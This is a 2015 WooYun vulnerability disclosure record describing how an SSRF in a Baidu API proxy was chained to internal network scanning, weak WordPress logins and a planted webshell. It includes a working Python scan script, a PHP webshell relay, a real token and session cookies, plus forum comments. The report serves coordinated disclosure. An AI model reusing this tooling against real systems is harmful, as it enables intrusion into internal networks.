{"id": 44710, "wybug_id": "wooyun-2015-099070", "wybug_title": "百度某个从SSRF到内网WebShell", "wybug_corp": "百度", "wybug_author": "Jannock", "wybug_date": "2015-03-02 15:56", "wybug_open_date": "2015-04-16 15:58", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-16：\t细节向公众公开  简要描述： 所有故事从一个简单的SSRF说起。。。 详细说明：  1、某次发现一个SSRFhttp://apistore.baidu.com/astore/toolshttpproxy\n\n功能十分全，包括get post 什么的。2、内网探测首先从dns爆破中获取部分内网ip，然后写个脚本探测探测脚本 \n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport jsonimport tracebackimport urllib reload(sys)  sys.setdefaultencoding('utf8')  headers = {'cookie':'自己加上','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'}for i in range(1, 255):    try:        print i        s = \"172.22.1.%s\" % (i)        conn = httplib.HTTPConnection('apistore.baidu.com')        conn.request(method='POST',                     url=\"/astore/toolshttpproxysend\",                     body='reqMethod=GET&reqUrl=http%3A%2F%2F' + s +'&token=token',                     headers=headers)        msg = conn.getresponse().read()        msg = json.loads(msg)        if msg[\"retMsg\"] == \"success\":           print s           f = open('rrrr.txt','ab+')           f.write(s + '\\r\\n')           f.write( urllib.unquote(msg[\"retData\"][\"responseHeader\"]).replace('<br/>','\\r\\n') + '\\r\\n')           f.write( urllib.unquote(msg[\"retData\"][\"responseBody\"]).replace('<br/>','\\r\\n') + '\\r\\n\\r\\n')           f.close()        conn.close()    except:        print traceback.format_exc()        pass\n探测结果：\n\n\n\n其中有个 wordpress 程序引起我注意http://172.22.1.19 (cdm.baidu.com)3、wordpress 弱口令探测\n\n弱口令结果还是比较多wanglu  admin拿了一个测试下先登陆 POST，再根据获取回来的cookie，加入到请求头中。http://apistore.baidu.com/astore/toolshttpproxysend?reqMethod=POST&reqUrl=http://172.22.1.19/wp-admin/&token=ae6e554399dd045278f4128312f13853&&reqHeaders[0][key]=Cookie&reqHeaders[0][value]=wc_session_cookie_534fc29aac95152772c55e78ddffb136=8fpvzWnjz76BNkvv4GJMrx1gvfVihDFS%7C%7C1425449844%7C%7C1425446244%7C%7C4bcc9f20e60d5905d3aaf9eda0c5fe28;woocommerce_items_in_cart=0;woocommerce_cart_hash=0;wordpress_test_cookie=WP+Cookie+check;wordpress_534fc29aac95152772c55e78ddffb136=wanglu%7C1425449844%7Cba1f72d7cd9660584197a34afaf1caf8;wordpress_534fc29aac95152772c55e78ddffb136=wanglu%7C1425449844%7Cba1f72d7cd9660584197a34afaf1caf8;wordpress_logged_in_534fc29aac95152772c55e78ddffb136=wanglu%7C1425449844%7C04c26a78d42c83cb884f52071d5c28c8;成功查询到后台登陆成功后的 html。后面就是简单的wordpress 拿shell，写模板。这个过程比较麻烦，不过折腾下就可以成功。4、连接webshell为了方便操作，本地写了一个php的转发代理\n<?php $webshell=\"http://apistore.baidu.com/astore/toolshttpproxysend\";$data['reqMethod']='POST';$data['reqUrl']='http://172.22.1.19/wp-content/themes/salient-new/404.php';$data['token']='ae6e554399dd045278f4128312f13853';$i = 0;foreach($_POST as $key => $value){ $data[\"reqBodyParams[$i][key]\"]=$key; $data[\"reqBodyParams[$i][value]\"]= urlencode( $value ); $i++;}$data = http_build_query($data);   $opts = array (   'http' => array (   'method' => 'POST',   'header'=> \"Content-type: application/x-www-form-urlencoded\\r\\nCookie: cookie\\r\\nX-Requested-With: XMLHttpRequest\\r\\nUser-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0\\r\\n\" .   \"Content-Length: \" . strlen($data) . \"\\r\\n\",   'content' => $data) );  $context = stream_context_create($opts);   $html = @file_get_contents($webshell, false, $context); $data = json_decode($html,true);echo urldecode($data[\"retData\"][\"responseBody\"]);?>\n过程完成，获取权限。\n\n   漏洞证明：  \n\n\n\n   修复方案：  内网也要注意安全   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-03-02 21:23 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-02 15:58 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  刚刚有个人人网ssrf内网sql注入的，一哥来了就ssrf直接shell百度，哈哈    \n     2015-03-02 16:01 |    \t\t大胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:122 漏洞数:12        )\t\t \n  好厉害的样子呢    \n     2015-03-02 16:09 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  一哥，请收下我的膝盖    \n     2015-03-02 16:10 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  碉堡了    \n     2015-03-02 16:13 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  这么快就被雷劈了    \n     2015-03-02 16:15 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  思路真好，看懂了    \n     2015-03-02 16:16 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  我喜欢看故事  - -     \n     2015-03-02 16:18 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  本地中转shell    \n     2015-03-02 16:28 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  请收下我的裤带。    \n     2015-03-02 16:29 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  思路真好，虽然没看懂     \n     2015-03-02 16:29 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  厉害。    \n     2015-03-02 16:30 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  牛逼    \n     2015-03-02 16:32 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  都是大神啊，求包养    \n     2015-03-02 16:38 |    \t\t盛大网络(乌云厂商)\t\t \n  一哥 多关注关注我 @Jannock    \n     2015-03-02 16:39 |    \t\t中兴通讯股份有限公司(乌云厂商)\t\t \n  一哥 多关注关注我 @Jannock     \n     2015-03-02 16:40 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:22        | :))\t\t \n  mark下    \n     2015-03-02 16:41 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @中兴通讯股份有限公司 @盛大网络  — —。能严肃一点么。。。。 瞄...    \n     2015-03-02 16:42 |    \t\t途牛旅游网(乌云厂商)\t\t \n  一哥 多关注关注我 @Jannock    \n     2015-03-02 16:43 |    \t\t7天连锁酒店(乌云厂商)\t\t \n  一哥 有空也可以关注一下我们小公司，么么哒。    \n     2015-03-02 16:46 |    \t\t快钱(乌云厂商)\t\t \n  一哥 多关注关注我 么么哒 @Jannock     \n     2015-03-02 16:48 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  楼上公司红灯区小姐拉客即视感……    \n     2015-03-02 16:49 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  一哥拿个小本本，一个个的记上了！哼    \n     2015-03-02 16:56 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  厂商回复亮了    \n     2015-03-02 16:59 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  楼上一大堆厂商求草，一个你射死他们    \n     2015-03-02 17:03 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  一哥把楼上一个个都先入库！    \n     2015-03-02 17:06 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  @快钱 @7天连锁酒店 @途牛旅游网 @中兴通讯股份有限公司 @盛大网络 厂商是要脑那样    \n     2015-03-02 17:07 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-03-02 17:09 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  这个和我以前的思路一模一样。    \n     2015-03-02 17:14 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  屌屌的    \n     2015-03-02 17:15 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  看来厂商求草啊 一哥能不能满足他们呢？    \n     2015-03-02 17:19 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:63        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  一哥，我是来看厂商的    \n     2015-03-02 17:19 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  一群调皮的厂商。 @盛大网络 把大家都带坏了。    \n     2015-03-02 17:33 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  来迟了 一哥 多关照关照小弟 @Jannock    \n     2015-03-02 17:56 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  厂商集体卖萌。。。    \n     2015-03-02 18:06 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  围观    \n     2015-03-02 18:07 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:586 漏洞数:171        | 破晓团队)\t\t \n  @7天连锁酒店 正好到北京七天连锁住呢。。    \n     2015-03-02 18:15 |    \t\tCatsay \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:16        | 屌丝一枚)\t\t \n  叼...围观    \n     2015-03-02 18:39 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  百度2015真是好开端啊    \n     2015-03-02 19:01 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  话说2015刚开始，百度中枪多少次了啊    \n     2015-03-02 19:11 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  恩，思路很好    \n     2015-03-02 19:19 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  准备看看公开    \n     2015-03-02 19:43 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  来看厂商    \n     2015-03-02 19:54 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  求包养~    \n     2015-03-02 20:24 |    \t\tcold \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 生命不息，折腾不止。)\t\t \n  彦宏说过技术改变世界，百度改变技术。。    \n     2015-03-02 20:56 |    \t\t蜉蝣 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        )\t\t \n  一哥快祭出大凶器，楼上的厂商一个都不放过，    \n     2015-03-02 21:04 |    \t\tCatsay \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:16        | 屌丝一枚)\t\t \n  厂商都来卖萌么    \n     2015-03-02 21:27 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  这个必须关注。    \n     2015-03-02 21:44 |    \t\t狂人 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:13        | Rank:999999999 漏洞数:999999999 | 小学生...)\t\t \n  我擦 百度主站？    \n     2015-03-02 21:47 |    \t\tbcwr \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 努力挖洞)\t\t \n  牛X，学习中    \n     2015-03-02 21:59 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  一哥，缺搞基的么？？？特么我要是女生我就跟定你了。    \n     2015-03-03 09:26 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:38        | 呵呵！)\t\t \n  赞    \n     2015-03-03 12:08 |    \t\tMik3y_14 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:29        | 愿君多采撷，此物最相思。)\t\t \n  厉害。    \n     2015-03-09 22:17 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  。。。。。。    \n     2015-03-23 09:10 |    \t\t白开水 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:27        | 苍茫的天涯是我的爱~)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 9 个乌云币提前查看   )     \n     2015-04-01 22:48 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  牛牛牛！    \n     2015-04-02 08:12 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  屌屌屌！    \n     2015-04-02 16:30 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  典型案例    \n     2015-04-04 23:50 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  我去，我开始以为是用struct2命令执行拿shell的，没想到直接搞WordPress，膜拜    \n     2015-04-10 00:26 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  找到一个点;想到一个好的想法 然后实现了。 Good这才是真正的安全研究者    \n     2015-04-13 14:57 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  xxxxxxxxx    \n     2015-04-13 15:19 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  nice    \n     2015-04-15 13:02 |    \t\t温柔的逍遥 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 温柔的逍遥)\t\t \n  z学习了    \n     2015-04-16 17:36 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  =。=一哥这么赤果果用菜刀链接，公然挑战百度的入侵检测嘛。    \n     2015-04-16 19:56 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  一哥快上 楼上厂商求撸    \n     2015-04-16 20:42 |    \t\tMark \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 渗透你的心)\t\t \n  一哥，请收下我的膝盖     \n     2015-04-16 20:47 |    \t\t屠龙宝刀点击就送 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 简要介绍不能为空)\t\t \n  一哥快满足楼上的厂商们    \n     2015-04-17 10:10 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  产商集体卖萌了。。    \n     2015-04-30 09:57 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  吊炸天    \n     2015-06-05 14:05 |    \t\t小夜 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 漫长的日子)\t\t \n  受益匪浅 叼    \n     2015-06-08 09:28 |    \t\t途牛旅游网(乌云厂商)\t\t \n  一哥 多关注关注我 @Jannock 么么哒    \n     2015-06-23 01:51 |    \t\tIOT \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 不知道什么时候才有很多人知道我呢)\t\t \n  mark下，楼上厂商有一天一个也跑不掉    \n     2015-06-28 13:52 |    \t\t0x12 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | <script>alert(/0x12/)</script>)\t\t \n  .    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}